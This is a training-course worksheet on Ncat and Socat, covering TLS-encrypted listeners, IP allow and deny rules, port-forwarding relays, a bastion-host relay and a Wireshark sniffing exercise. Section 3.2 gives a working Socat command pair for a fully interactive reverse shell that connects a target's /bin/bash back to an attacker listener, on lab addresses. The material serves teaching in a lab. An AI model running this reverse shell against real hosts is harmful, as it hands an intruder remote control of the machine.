# 06.03: Ncat, Socat & Encrypted Relays

**Level:** 🟡 Intermediate | **Time:** 1.5 h | **XP:** 75

## 🎯 Learning Objectives
- Upgrade from insecure cleartext Netcat to modern **Ncat** with native SSL/TLS encryption
- Restrict socket access using Ncat's built-in access control lists (`--allow`, `--deny`)
- Master **Socat** for bidirectional port-forwarding and proxy relays
- Analyze encrypted socket communications in Wireshark
- Deploy encrypted emergency maintenance tunnels in production environments

---

## 1. The Insecurity of Traditional Netcat

As demonstrated in Worksheet 06.02, standard Netcat possesses zero cryptographic protections:
- Passwords typed across a Netcat socket are visible to anyone running Wireshark or tcpdump.
- Man-in-the-Middle (MITM) attackers can tamper with transferred files in transit.

To resolve this, the Nmap Project created **Ncat**, a modern reimplementation featuring native **SSL/TLS encryption**.

---

## 2. Ncat: Secure, Encrypted Socket Communications

Ncat is included with the `nmap` package on Kali and modern Linux distributions.

```bash
# Verify Ncat is installed
ncat --version
```

### 2.1 Starting an Encrypted SSL Listener:
```bash
ncat -lvnp 8443 --ssl
```
Ncat automatically generates an ephemeral self-signed SSL/TLS certificate in memory and negotiates an encrypted TLS handshake!

### 2.2 Connecting with SSL Encryption:
```bash
ncat -vn 10.10.10.20 8443 --ssl
```

### 2.3 Built-in Access Control (Micro-Firewall):
Ncat can whitelist or blacklist connecting IP addresses directly:
```bash
# Only allow connections from Kali (10.10.10.10); drop all others:
ncat -lvnp 9000 --allow 10.10.10.10

# Allow entire subnet except a specific rogue machine:
ncat -lvnp 9000 --allow 10.10.10.0/24 --deny 10.10.10.99
```

### 2.4 Multi-User Encrypted Chat Broker:
Ncat can act as an encrypted chat room server for multiple participants:
```bash
ncat -lvnp 9999 --ssl --broker
```
Any client that connects can chat with all other connected users simultaneously!

---

## 3. Socat: The Advanced Bidirectional Relay

While Netcat connects standard I/O to a network socket, **Socat** connects *any two arbitrary data streams* together:

```
Address 1 ◄═════════ Socat Bidirectional Engine ═════════► Address 2
```

### 3.1 Port Forwarding / Proxy Relay
Forward incoming traffic on port 8080 of your machine directly to Ubuntu Server's web server on port 80:

```bash
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.20:80
```
- `TCP-LISTEN:8080`: Listens on local port 8080.
- `fork`: Spawns a child process for each new incoming connection (handles concurrent users!).
- `reuseaddr`: Allows immediate restarting of the socket without waiting for `TIME_WAIT`.
- `TCP:10.10.10.20:80`: Forwards all traffic to the target web server.

### 3.2 Spawning a Full Interactive TTY Reverse Shell
Standard Netcat reverse shells lack job control, arrow keys, tab completion, and `Ctrl + C` handling (pressing Ctrl+C kills the whole shell!). 
Socat can establish a **fully interactive Linux PTY**:

```bash
# On Attacker:
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# On Target:
socat TCP:10.10.10.10:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

---

## 4. 🎯 Mission: Encrypted Socket vs. Cleartext Sniffing

### Step 1: Start an Encrypted Ncat Listener on Ubuntu Server
On **ubuntu-srv**:
```bash
ncat -lvnp 8443 --ssl
```

### Step 2: Capture and Connect with TLS from Kali
1. On **Kali**, launch Wireshark on `eth0`, filter: `tcp.port == 8443`.
2. In Kali terminal, connect securely:
   ```bash
   ncat -vn 10.10.10.20 8443 --ssl
   ```
3. Type: `CONFIDENTIAL: Credit card number 4111-2222-3333-4444` and press Enter.

### Step 3: Inspect the Encrypted Stream in Wireshark
1. Stop capture in Wireshark.
2. Observe the packet sequence:
   - Notice the standard TCP 3-way handshake.
   - Followed immediately by a **TLS Handshake** (`Client Hello`, `Server Hello`, `Certificate`).
   - Followed by packets labeled `Application Data`!
3. Right-click ➔ **Follow ➔ TCP Stream**:
   - Notice the text is **completely scrambled binary ciphertext**! 
   - Unlike standard Netcat, no credit card numbers, passwords, or commands are visible on the wire.

---

## 💼 Business Corner: Secure Jump-Hosts & Out-of-Band Relays
In production cloud environments (AWS, Azure, GCP), databases in private subnets are isolated with no public IP addresses.

When a database administrator needs emergency access to diagnose production corruption:
- A cloud engineer spins up a hardened Linux bastion (jump host).
- A secured, authenticated Socat or Ncat relay forwards encrypted traffic across the boundary:
  ```bash
  socat OPENSSL-LISTEN:443,cert=server.pem,verify=1 TCP:db-private.internal:5432
  ```
- All traffic crossing the public cloud network is strongly encrypted and authenticated with client certificates, satisfying **SOC 2 Type II** and **ISO 27001** transit encryption controls.

---

## 🧠 Knowledge Check
1. What command launches an Ncat listener encrypted with SSL/TLS on port 443?
2. How do you configure Ncat to only allow connections from IP `10.10.10.10`?
3. What does the `fork` option do in a Socat listener command?
4. How does Ncat's `--ssl` mode prevent an analyst running Wireshark from viewing transmitted commands?

<details><summary>Answers</summary>

1. `ncat -lvnp 443 --ssl`.
2. `ncat -lvnp <port> --allow 10.10.10.10`.
3. It spawns a new child process for each incoming connection, allowing the listener to serve multiple clients simultaneously without blocking.
4. It wraps the TCP socket inside an encrypted TLS session, encrypting all payload bytes with symmetric session keys.
</details>

---
⬅️ [02 File Transfers & Shells](02-file-transfers-banners-shells.md) | ➡️ [Module 06 Cheat Sheet](cheatsheet.md) | ➡️ [Module 07](../07-Snort-IDS/01-ids-ips-concepts.md)
